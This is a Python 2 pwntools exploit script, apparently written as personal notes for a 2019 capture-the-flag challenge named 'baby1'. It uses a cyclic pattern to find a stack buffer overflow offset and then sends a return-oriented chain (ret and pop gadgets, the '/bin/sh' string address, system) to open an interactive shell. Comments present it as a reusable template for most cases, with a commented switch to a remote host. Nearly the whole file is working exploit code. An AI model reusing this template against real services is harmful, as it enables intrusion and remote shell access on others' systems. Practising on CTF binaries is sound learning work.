# python2
from pwn import *
# /home/fc/Documents/CTF/fest2019/baby01/baby01



# common func get_offset:
def get_offset(elf):
	io = process(elf.path)
	io.sendline(cyclic(2010))
	io.wait()
	core = io.corefile
	stack = core.rsp
	info("%#x stack", stack)		# info, print on shell window
	pattern = core.read(stack, 4)
	info("%r pattern", pattern)
	offset = cyclic_find(pattern)
	info("OFFSET : %s", offset)		#  -1
	return offset

"""
# 1. most important part is find the payload
# 2. In ubuntu, add ret to payload
	payload = "A"*40 + gadget + print_flag + system
	p = 'A'*(offset) + ret + pop_gadget + shell + system
"""

elf = context.binary = ELF('baby1')

# here is the diff
offset = get_offset(elf)

shell = next(elf.search("/bin/sh"))		# always like this
system = elf.symbols.system   			# always like this too
ret = 0x000000000040053e
pop_gadget = 0x0000000000400793

# ************ breakpoint***********
info("SYSTEM : %#x", system)
info("SHELL : %#x", shell)
info("POP Gadget : %#x", pop_gadget)

shell = p64(shell)
system = p64(system)
ret = p64(ret)
pop_gadget = p64(pop_gadget)

info("SYSTEM : %s", system)
info("SHELL : %s", shell)
info("POP Gadget : %s", pop_gadget)
# ************ breakpoint***********


# start to prepare the payload
payload = 'A'*(offset)		# 'A'*(-1) == '' == True
payload += ret
payload += pop_gadget
payload += shell
payload += system
# p = 'A'*(offset) + ret + pop_gadget + shell + system


# what is this payload exactly???
print(len(payload))
info("The final payload is: %s ", payload)	# hex
info("End of payload!")


# below: template writing for most conditions!!!
io = process(elf.path)		# io = remote(host, port)

io.recvuntil("input: ")
# io.sendline("hello")
io.sendline(payload)
io.interactive()
